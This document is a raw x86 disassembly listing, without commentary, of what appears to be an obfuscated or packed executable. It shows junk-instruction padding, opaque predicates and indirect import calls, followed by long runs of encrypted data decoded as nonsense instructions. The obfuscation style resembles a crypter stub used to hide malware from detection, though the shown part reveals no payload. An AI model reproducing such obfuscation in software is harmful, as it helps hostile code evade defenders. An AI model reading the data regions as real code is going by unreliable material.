  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428363,0x4282cb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42834b,0x42823f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42837f,0x42821f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42827f
  40b386:	adc    DWORD PTR ds:0x428173,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282e7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428253,0x42823f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42814b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428367,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428147,0x42837b
  40b3c4:	call   0x422046
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42824b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42827b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428263,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x4282fb
  40b3f3:	mov    eax,ds:0x428273
  40b3f8:	cmp    DWORD PTR ds:0x42827b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428ebc
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42816b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42825b
  40b422:	or     DWORD PTR ds:0x4282eb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428147,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428373,0x0
  40b441:	mov    DWORD PTR ds:0x4282eb,ecx
  40b447:	mov    DWORD PTR ds:0x42836b,0x318c
  40b451:	mov    DWORD PTR ds:0x42837b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428243,0x461b
  40b46a:	mov    DWORD PTR ds:0x42827f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428373,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ec0
  40b48f:	xor    edx,DWORD PTR ds:0x428253
  40b495:	adc    ecx,DWORD PTR ds:0x42835b
  40b49b:	and    DWORD PTR ds:0x42814b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42825f
  40b4b7:	xor    DWORD PTR ds:0x428373,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428243
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42815f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42813b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42820b,0x9f5
  40b501:	mov    DWORD PTR ds:0x428287,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42815f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fb3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428da8
  40b528:	sbb    DWORD PTR ds:0x428277,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281af
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42839b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42817b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428223
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428253
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428283,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42835b,0x428223
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x56
  40b596:	push   ecx
  40b597:	mov    eax,ds:0x18130a70
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	(bad)  
  40b5a2:	(bad)  
  40b5a3:	sub    dh,BYTE PTR [eax]
  40b5a5:	mov    edx,0x7d9feff
  40b5aa:	xchg   edx,eax
  40b5ab:	outs   dx,BYTE PTR ds:[esi]
  40b5ac:	pop    esp
  40b5ad:	mov    ecx,0x6be319b4
  40b5b2:	adc    BYTE PTR [eax+0x4f],cl
  40b5b5:	cld    
  40b5b6:	or     BYTE PTR [eax+ebp*4+0x2f768c70],dl
  40b5bd:	xor    eax,0xb9c12290
  40b5c2:	popa   
  40b5c3:	xchg   esp,eax
  40b5c4:	push   eax
  40b5c5:	adc    esp,DWORD PTR [edi]
  40b5c7:	xchg   edi,eax
  40b5c8:	pop    eax
  40b5c9:	leave  
  40b5ca:	adc    DWORD PTR [ecx],ebp
  40b5cc:	enter  0x9dbd,0x8e
  40b5d0:	stos   DWORD PTR es:[edi],eax
  40b5d1:	out    dx,al
  40b5d2:	in     eax,dx
  40b5d3:	daa    
  40b5d4:	mov    DWORD PTR [ecx+0x108b6030],edi
  40b5da:	pop    esi
  40b5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5dc:	dec    ebp
  40b5dd:	fs push 0xffffffba
  40b5e0:	data16 fwait
  40b5e2:	add    eax,0x631cf35
  40b5e7:	test   al,0x1
  40b5e9:	out    dx,al
  40b5ea:	jmp    0x40b665
  40b5ec:	inc    edx
  40b5ed:	add    ah,BYTE PTR [edx]
  40b5ef:	dec    edx
  40b5f0:	(bad)  
  40b5f1:	pop    eax
  40b5f2:	push   edi
  40b5f3:	loop   0x40b576
  40b5f5:	fld    QWORD PTR [edi+edi*1]
  40b5f8:	into   
  40b5f9:	xlat   BYTE PTR ds:[ebx]
  40b5fa:	pop    edi
  40b5fb:	add    bl,dh
  40b5fd:	xchg   BYTE PTR [ebp-0x6dc2763a],ch
  40b603:	adc    DWORD PTR [eax],eax
  40b605:	shl    DWORD PTR [ebx+0x2beeffae],0x2b
  40b60c:	xlat   BYTE PTR ds:[ebx]
  40b60d:	fadd   QWORD PTR ss:[ebx+0x6aa06f19]
  40b614:	imul   esi,DWORD PTR [ebp-0x438bb9f8],0xffffff8a
  40b61b:	mov    al,0xf3
  40b61d:	cwde   
  40b61e:	mov    ebx,0x784e1209
  40b623:	pop    ebp
  40b624:	mov    ecx,0x1b9bf4bc
  40b629:	test   ebx,esi
  40b62b:	enter  0xc353,0xe6
  40b62f:	popf   
  40b630:	stc    
  40b631:	pop    eax
  40b632:	push   ds
  40b633:	imul   esi,DWORD PTR [edi+edi*4+0x6],0xffffffe7
  40b638:	adc    eax,ecx
  40b63a:	cwde   
  40b63b:	(bad)  
  40b63c:	shl    DWORD PTR [ebp-0x25],cl
  40b63f:	pop    ss
  40b640:	out    dx,al
  40b641:	push   eax
  40b642:	inc    edi
  40b643:	lea    esp,ds:[edx+ebx*4+0x51bd2138]
  40b64b:	mov    WORD PTR [edi-0x28e250e1],es
  40b651:	cs jp  0x40b63a
  40b654:	mov    dh,0x5
  40b656:	pop    edx
  40b657:	out    0x32,al
  40b659:	hlt    
  40b65a:	mov    bl,BYTE PTR [esi-0x60542fdc]
  40b660:	sbb    ebx,DWORD PTR [ebx]
  40b662:	sbb    eax,0x977c016d
  40b667:	push   0x44
  40b669:	dec    esi
  40b66a:	adc    ah,0xef
  40b66d:	mov    WORD PTR [ebx-0x58bc63e6],fs
  40b673:	jge    0x40b67a
  40b675:	fwait
  40b676:	push   ss
  40b677:	mov    WORD PTR [eax-0x37],gs
  40b67a:	xchg   esp,eax
  40b67b:	pop    ecx
  40b67c:	ja     0x40b6b4
  40b67e:	xor    eax,0x8466a89
  40b683:	xchg   ecx,eax
  40b684:	jmp    0x40b610
  40b686:	lea    esp,[edi-0x126d9bf8]
  40b68c:	sti    
  40b68d:	jo     0x40b6b0
  40b68f:	push   cs
  40b690:	popa   
  40b691:	mov    cl,0xc2
  40b693:	mov    DWORD PTR [ecx+0x36b7684d],ebx
  40b699:	lods   eax,DWORD PTR ds:[esi]
  40b69a:	jno    0x40b625
  40b69c:	inc    esp
  40b69d:	inc    edx
  40b69e:	add    eax,0x9f381aa4
  40b6a3:	out    dx,eax
  40b6a4:	jecxz  0x40b6ec
  40b6a6:	pop    edx
  40b6a7:	pop    ebx
  40b6a8:	ds mov cl,0xe6
  40b6ab:	pop    ecx
  40b6ac:	inc    eax
  40b6ad:	pusha  
  40b6ae:	add    ecx,eax
  40b6b0:	ds fwait
  40b6b2:	xor    BYTE PTR [eax+0x5],0x33
  40b6b6:	(bad)  
  40b6b7:	mov    eax,0x840d19a3
  40b6bc:	jle    0x40b662
  40b6be:	mov    dl,0x40
  40b6c0:	cmp    esi,DWORD PTR [esi+ebp*2+0x36806916]
  40b6c7:	nop
  40b6c8:	imul   esp,DWORD PTR [edi+0x5b],0x60
  40b6cc:	icebp  
  40b6cd:	jns    0x40b6aa
  40b6cf:	je     0x40b6bc
  40b6d1:	mov    esi,0x9c8c30f7
  40b6d6:	mov    ds:0x64c5087c,al
  40b6db:	xchg   edx,eax
  40b6dc:	ins    DWORD PTR es:[edi],dx
  40b6dd:	sahf   
  40b6de:	call   0xea58:0x377916e7
  40b6e5:	loopne 0x40b671
  40b6e7:	dec    edx
  40b6e8:	mov    bl,0x4a
  40b6ea:	ror    BYTE PTR [ebx],cl
  40b6ec:	cmc    
  40b6ed:	inc    ebp
  40b6ee:	gs push ebx
  40b6f0:	sahf   
  40b6f1:	xchg   DWORD PTR [edi-0x45],esp
  40b6f4:	retf   0x9239
  40b6f7:	nop
  40b6f8:	xor    ecx,0x3dd3c9a9
  40b6fe:	jb     0x40b6e3
  40b700:	(bad)  
  40b701:	ficom  DWORD PTR [ebx-0x61876a29]
  40b707:	xlat   BYTE PTR ds:[ebx]
  40b708:	mov    eax,ds:0xab7f63fd
  40b70d:	xchg   ebx,eax
  40b70e:	in     al,0xb3
  40b710:	nop
  40b711:	push   ebx
  40b712:	(bad)  
  40b713:	out    0x64,eax
  40b715:	dec    ebp
  40b716:	sub    al,0xa7
  40b718:	cmp    eax,DWORD PTR [eax]
  40b71a:	push   cs
  40b71b:	cld    
  40b71c:	pop    esi
  40b71d:	int3   
  40b71e:	pop    ebx
  40b71f:	dec    esp
  40b720:	retf   
  40b721:	mov    ds:0x80bd05cb,eax
  40b726:	test   al,0xeb
  40b728:	loope  0x40b71d
  40b72a:	in     eax,dx
  40b72b:	lds    edx,FWORD PTR [edi+ebx*8-0x22b0cb92]
  40b732:	jg     0x40b788
  40b734:	sub    ch,al
  40b736:	mov    BYTE PTR [ecx],ch
  40b738:	iret   
  40b739:	aas    
  40b73a:	imul   DWORD PTR [eax]
  40b73c:	call   0xa235b06
  40b741:	test   BYTE PTR [edi],cl
  40b743:	ret    
  40b744:	test   BYTE PTR [edx+0x3fd8b2d7],dh
  40b74a:	jne    0x40b737
  40b74c:	bound  esp,QWORD PTR [ecx+0x1cdf1d1d]
  40b752:	inc    esi
  40b753:	add    ecx,DWORD PTR [edx-0x18]
  40b756:	fcmove st,st(2)
  40b758:	mov    edi,0x2e32f21c
  40b75d:	shl    DWORD PTR [esp+ebp*8+0x3],cl
  40b761:	sub    ah,bl
  40b763:	add    DWORD PTR [edx+0x12c4498d],edx
  40b769:	sub    al,0xe9
  40b76b:	push   edi
  40b76c:	inc    esi
  40b76d:	pop    esp
  40b76e:	push   0x2a43e1f6
  40b773:	or     eax,0xa1c27363
  40b778:	cmp    al,0x5f
  40b77a:	mov    cs,WORD PTR [ebx-0x7f]
  40b77d:	or     al,BYTE PTR [ecx]
  40b77f:	sbb    BYTE PTR [edi+0x3409ba5b],ch
  40b785:	sbb    BYTE PTR [esi+0x3cad2a20],0xf
  40b78c:	aaa    
  40b78d:	es cld 
  40b78f:	scas   al,BYTE PTR es:[edi]
  40b790:	jp     0x40b79d
  40b792:	frstor [ebx+0x5ad2048d]
  40b798:	or     ebx,DWORD PTR [esi+0x21fa5e15]
  40b79e:	add    dl,BYTE PTR [eax]
  40b7a0:	fisub  WORD PTR [ebx-0x2f28b25f]
  40b7a6:	bound  edx,QWORD PTR [ecx]
  40b7a8:	mov    ch,0xe6
  40b7aa:	ficomp WORD PTR [eax-0x715cf2a3]
  40b7b0:	mov    al,0x62
  40b7b2:	imul   ebp,ebp,0x1f
  40b7b5:	jle    0x40b79e
  40b7b7:	inc    eax
  40b7b8:	retf   0x1769
  40b7bb:	jo     0x40b825
  40b7bd:	data16 xor al,0x8c
  40b7c0:	add    ecx,ebx
  40b7c2:	je     0x40b75a
  40b7c4:	xor    al,0xd7
  40b7c6:	out    0xe9,al
  40b7c8:	mov    dl,BYTE PTR [esi-0x12]
  40b7cb:	sbb    al,0xc
  40b7cd:	mov    dl,0xca
  40b7cf:	pop    eax
  40b7d0:	add    al,0xcf
  40b7d2:	mov    ch,0xe8
  40b7d4:	loop   0x40b826
  40b7d6:	mov    cl,0x12
  40b7d8:	bound  eax,QWORD PTR [edi+0x1]
  40b7db:	rcr    eax,0xa5
  40b7de:	scas   eax,DWORD PTR es:[edi]
  40b7df:	mov    cl,bh
  40b7e1:	pop    esi
  40b7e2:	and    BYTE PTR [eax-0x427c963a],al
  40b7e8:	call   0xec2f:0x1d71a2aa
  40b7ef:	jmp    0x3d07d3a7
  40b7f4:	and    al,0xa
  40b7f6:	mov    ecx,0x75f0796
  40b7fb:	out    0xc5,eax
  40b7fd:	jno    0x40b793
  40b7ff:	es scas eax,DWORD PTR es:[edi]
  40b801:	div    bl
  40b803:	add    BYTE PTR [eax],ah
  40b805:	int    0x16
  40b807:	popf   
  40b808:	jmp    0x608d:0x12440861
  40b80f:	rcl    BYTE PTR [ebx-0x42],0x26
  40b813:	ret    0xa0c6
  40b816:	sbb    DWORD PTR [ebp-0x22b651],0x9e5cb157
  40b820:	popf   
  40b821:	int    0x51
  40b823:	daa    
  40b824:	ins    BYTE PTR es:[edi],dx
  40b825:	add    DWORD PTR [edi-0x7539fa5e],0xffffffbe
  40b82c:	stos   BYTE PTR es:[edi],al
  40b82d:	pop    es
  40b82e:	cmp    al,0x4a
  40b830:	shl    BYTE PTR [ebx],cl
  40b832:	mov    ecx,0x3d176351
  40b837:	sbb    BYTE PTR [ebx+0x7d],0x88
  40b83b:	sahf   
  40b83c:	aas    
  40b83d:	sbb    DWORD PTR [edi+0x44],esp
  40b840:	add    eax,0x8e12715f
  40b845:	or     cl,0x92
  40b848:	dec    ecx
  40b849:	add    ah,BYTE PTR [ecx]
  40b84b:	xor    DWORD PTR [edx-0x5323f9be],esp
  40b851:	jbe    0x40b8be
  40b853:	add    ch,BYTE PTR [edi+edi*2-0x15c6bb5e]
  40b85a:	cmp    ebp,eax
  40b85c:	sbb    eax,0xaf215788
  40b861:	addr16 cdq 
  40b863:	dec    eax
  40b864:	not    DWORD PTR [eax-0x40]
  40b867:	cdq    
  40b868:	dec    esp
  40b869:	or     BYTE PTR [esi],dl
  40b86b:	dec    ebp
  40b86c:	mov    bh,BYTE PTR [edx]
  40b86e:	aam    0x4e
  40b870:	(bad)  
  40b871:	jmp    0x9903af41
  40b876:	lods   al,BYTE PTR ds:[esi]
  40b877:	enter  0xcb55,0x21
  40b87b:	fs push cs
  40b87d:	inc    esi
  40b87e:	push   0xe2564e12
  40b883:	add    esi,DWORD PTR [esi+0x79195ed3]
  40b889:	xlat   BYTE PTR ds:[ebx]
  40b88a:	iret   
  40b88b:	rcl    al,1
  40b88d:	push   0x6692e478
  40b892:	push   es
  40b893:	ret    0x80f8
  40b896:	neg    DWORD PTR [ebx]
  40b898:	je     0x40b8c6
  40b89a:	pop    ss
  40b89b:	lahf   
  40b89c:	pushf  
  40b89d:	sub    BYTE PTR [esi],bh
  40b89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a0:	add    al,0x3e
  40b8a2:	test   al,0x80
  40b8a4:	sub    eax,0x5f7af60f
  40b8a9:	shr    DWORD PTR [ecx-0x4e],cl
  40b8ac:	push   ecx
  40b8ad:	fst    DWORD PTR [ecx]
  40b8af:	mov    edi,DWORD PTR [ebx-0x5d]
  40b8b2:	push   es
  40b8b3:	js     0x40b897
  40b8b5:	inc    ebx
  40b8b6:	push   ebp
  40b8b7:	xchg   ebx,eax
  40b8b8:	sbb    DWORD PTR [eax-0x2c29e3c0],ebx
  40b8be:	jl     0x40b87b
  40b8c0:	int    0x66
  40b8c2:	lods   al,BYTE PTR ds:[esi]
  40b8c3:	mov    ds:0x2cd905e0,al
  40b8c8:	call   0x8949b2e
  40b8cd:	and    eax,0x8a6eaf8c
  40b8d2:	sub    edx,DWORD PTR [edx+0x3d]
  40b8d5:	jecxz  0x40b924
  40b8d7:	sub    bl,BYTE PTR [ecx]
  40b8d9:	or     eax,0x627806c9
  40b8de:	sub    esp,DWORD PTR [ecx]
  40b8e0:	arpl   WORD PTR [esi],ax
  40b8e2:	loopne 0x40b933
  40b8e4:	push   ecx
  40b8e5:	jl     0x40b8d7
  40b8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e8:	or     BYTE PTR [ecx],al
  40b8ea:	dec    ebp
  40b8eb:	pop    edx
  40b8ec:	add    esp,DWORD PTR [ebx+0x35f3f551]
  40b8f2:	inc    eax
  40b8f3:	outs   dx,DWORD PTR ds:[esi]
  40b8f4:	push   es
  40b8f5:	xor    eax,0x606db584
  40b8fa:	into   
  40b8fb:	inc    BYTE PTR [edx]
  40b8fd:	mov    edi,0x6cde23d3
  40b902:	jo     0x40b96a
  40b904:	xor    al,0x15
  40b906:	push   eax
  40b907:	pop    edi
  40b908:	ja     0x40b90b
  40b90a:	jg     0x40b964
  40b90c:	idiv   DWORD PTR [esi+0x54adbfc6]
  40b912:	inc    edi
  40b913:	cs ss push ecx
  40b916:	jb     0x40b97b
  40b918:	mov    edx,?
  40b91a:	je     0x40b922
  40b91c:	leave  
  40b91d:	jmp    0xd2ce:0xee828a77
  40b924:	add    dl,BYTE PTR [esi-0x5b71dd6e]
  40b92a:	les    ecx,FWORD PTR [ebx+0x7b0bd920]
  40b930:	pop    ecx
  40b931:	hlt    
  40b932:	(bad)  
  40b933:	fimul  WORD PTR [ebp-0x61]
  40b936:	push   cs
  40b937:	aaa    
  40b938:	mov    ecx,0xadeaacd
  40b93d:	push   edx
  40b93e:	es (bad) 
  40b940:	ds inc esi
  40b942:	jp     0x40b8e4
  40b944:	imul   bp,WORD PTR ds:0x3597dd67,0xffc0
  40b94c:	pop    esi
  40b94d:	int    0x60
  40b94f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b950:	aas    
  40b951:	adc    dl,BYTE PTR [ecx-0x12]
  40b954:	fistp  WORD PTR [edx]
  40b956:	add    esi,DWORD PTR [esi]
  40b958:	push   ds
  40b959:	push   ss
  40b95a:	lahf   
  40b95b:	mov    bl,0xc1
  40b95d:	mov    bl,0xc7
  40b95f:	xor    BYTE PTR [eax+edi*8+0x11007015],ah
  40b966:	aaa    
  40b967:	xor    eax,0xb16141a1
  40b96c:	and    ebx,edi
  40b96e:	xchg   BYTE PTR gs:[edi+0x4a],ah
  40b972:	xor    ah,BYTE PTR ds:0xefe1d17
  40b978:	mov    BYTE PTR [edx],ch
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282d3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428257
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282e7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282ef,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428257,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282ef,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42837f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282ef,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428dac
  40b9f7:	adc    DWORD PTR ds:0x42837b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282d7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282eb
  40ba10:	mov    DWORD PTR ds:0x4282d7,edx
  40ba16:	adc    DWORD PTR ds:0x4282d3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428147
  40ba26:	xor    DWORD PTR ds:0x428373,edx
  40ba2c:	or     DWORD PTR ds:0x42821f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428257
  40ba3c:	or     DWORD PTR ds:0x4282f3,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	test   eax,0x607cc529
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	jg     0x40bace
  40bab1:	mov    edx,0x90ab2ce0
  40bab6:	mov    ch,BYTE PTR [esi-0x4c1fdbec]
  40babc:	mov    ah,0x94
  40babe:	arpl   bp,cx
  40bac0:	jg     0x40baec
  40bac2:	ffreep st(3)
  40bac5:	dec    BYTE PTR [ebx+0x2e10ffa8]
  40bacb:	stc    
  40bacc:	test   DWORD PTR [esi+0xc],edx
  40bacf:	cmp    BYTE PTR [ecx],dl
  40bad1:	pushf  
  40bad2:	dec    ecx
  40bad3:	add    BYTE PTR [eax],dh
  40bad5:	adc    BYTE PTR [esi+0x57],0xaf
  40bad9:	pop    ecx
  40bada:	and    al,0x5e
  40badc:	aaa    
  40badd:	test   eax,0x5d0ce980
  40bae2:	sub    eax,0xf44fc379
  40bae7:	mov    eax,0x4ca780b9
  40baec:	or     edx,DWORD PTR [ebx]
  40baee:	xchg   BYTE PTR [ebx-0x58],bh
  40baf1:	xor    eax,0x7c2898d7
  40baf6:	xchg   esi,eax
  40baf7:	pop    esi
  40baf8:	cdq    
  40baf9:	rol    BYTE PTR [esi+eiz*8],cl
  40bafc:	aam    0xa
  40bafe:	jl     0x40bb24
  40bb00:	sub    DWORD PTR [ecx+ebx*4-0x77ec38b6],edi
  40bb07:	leave  
  40bb08:	pop    esi
  40bb09:	mov    esp,esp
  40bb0b:	sub    eax,0x74680ca1
  40bb10:	adc    BYTE PTR [eax],dl
  40bb12:	adc    eax,0xaaa57323
  40bb17:	mov    cl,0x52
  40bb19:	jg     0x40bb36
  40bb1b:	mov    cl,0x21
  40bb1d:	mov    cl,0x86
  40bb1f:	mov    al,0xf9
  40bb21:	addr16 (bad) 
  40bb23:	fs out dx,al
  40bb25:	pop    edi
  40bb26:	jnp    0x40bafd
  40bb28:	sub    al,0x2d
  40bb2a:	lds    edx,FWORD PTR [esi]
  40bb2c:	pop    ds
  40bb2d:	iret   
  40bb2e:	fstp   DWORD PTR [esi-0x58]
  40bb31:	stos   DWORD PTR es:[edi],eax
  40bb32:	add    al,0xe0
  40bb35:	jns    0x40bb2b
  40bb37:	and    ecx,DWORD PTR [eax]
  40bb39:	xor    eax,0xd6b7514d
  40bb3e:	aaa    
  40bb3f:	push   cs
  40bb40:	ss xchg esi,eax
  40bb42:	and    eax,0x6179e82d
  40bb47:	sti    
  40bb48:	inc    ecx
  40bb49:	pop    edi
  40bb4a:	test   al,0xdc
  40bb4c:	fs int3 
  40bb4e:	cmp    bh,BYTE PTR [edi]
  40bb50:	(bad)  
  40bb53:	jbe    0x40bb09
  40bb55:	les    ebp,FWORD PTR [edi-0x349dee0b]
  40bb5b:	test   DWORD PTR [edi],edi
  40bb5d:	test   BYTE PTR [esi+0x11a0f018],bl
  40bb63:	cmp    al,0xf
  40bb65:	mov    WORD PTR [ebp-0x3d5d68b2],cs
  40bb6b:	sub    dh,BYTE PTR ds:0x23b6885c
  40bb71:	add    eax,0x308d1eec
  40bb76:	push   0xc5160a5d
  40bb7b:	fdivr  QWORD PTR [edx+0x6c2880c0]
  40bb81:	pop    edi
  40bb82:	nop
  40bb83:	pop    esi
  40bb84:	xor    eax,0xabb48aa5
  40bb89:	nop
  40bb8a:	in     eax,dx
  40bb8b:	mov    al,ds:0x1e910b7f
  40bb90:	and    bh,al
  40bb92:	cmc    
  40bb93:	aas    
  40bb94:	or     ch,BYTE PTR [esi]
  40bb96:	sbb    DWORD PTR [ebp+0x22],esi
  40bb99:	jmp    0x40bb20
  40bb9b:	hlt    
  40bb9c:	push   ebx
  40bb9d:	or     al,0xb0
  40bb9f:	mov    BYTE PTR [ecx],bl
  40bba1:	xchg   edi,eax
  40bba2:	add    dl,BYTE PTR [edi]
  40bba4:	push   ds
  40bba5:	sbb    BYTE PTR [ecx],ch
  40bba7:	cld    
  40bba8:	push   eax
  40bba9:	jae    0x40bb7d
  40bbab:	outs   dx,BYTE PTR ds:[esi]
  40bbac:	stos   DWORD PTR es:[edi],eax
  40bbad:	jecxz  0x40bba8
  40bbaf:	push   ds
  40bbb0:	or     eax,edx
  40bbb2:	test   al,0x87
  40bbb4:	neg    ebx
  40bbb6:	aas    
  40bbb7:	scas   eax,DWORD PTR es:[edi]
  40bbb8:	sub    ch,BYTE PTR [edi-0x5a]
  40bbbb:	stc    
  40bbbc:	out    0x8d,eax
  40bbbe:	iret   
  40bbbf:	xchg   edx,eax
  40bbc0:	(bad)  
  40bbc1:	ja     0x40bbc9
  40bbc3:	aas    
  40bbc4:	dec    esi
  40bbc5:	or     esi,DWORD PTR [edi]
  40bbc7:	rcl    ch,0x6e
  40bbca:	sbb    DWORD PTR [ecx],esi
  40bbcc:	or     al,0xee
  40bbce:	or     cl,BYTE PTR [edi-0x159f43c]
  40bbd4:	push   edi
  40bbd5:	pop    eax
  40bbd6:	cmp    ah,cl
  40bbd8:	aad    0x5f
  40bbda:	call   0xf4fc:0x265dde81
  40bbe1:	call   0x83ab:0xaf825325
  40bbe8:	mov    dl,BYTE PTR [ecx-0x11]
  40bbeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbec:	stos   DWORD PTR es:[edi],eax
  40bbed:	mov    DWORD PTR [esi+0x15],ebx
  40bbf0:	stos   BYTE PTR es:[edi],al
  40bbf1:	inc    ebp
  40bbf2:	cmp    eax,0xe60ad3d3
  40bbf7:	mov    ebx,0x68b97755
  40bbfc:	inc    edx
  40bbfd:	gs daa 
  40bbff:	adc    esi,edi
  40bc01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc02:	add    DWORD PTR [eax+ecx*1],esi
  40bc05:	retf   0xda4c
  40bc08:	test   DWORD PTR [edi+esi*1+0x12fcfd21],ecx
  40bc0f:	cli    
  40bc10:	(bad)  [eax+0x2]
  40bc13:	std    
  40bc14:	out    dx,eax
  40bc15:	icebp  
  40bc16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc17:	stos   DWORD PTR es:[edi],eax
  40bc18:	lods   eax,DWORD PTR ds:[esi]
  40bc19:	or     DWORD PTR ds:0x515ad058,0x3ce5caef
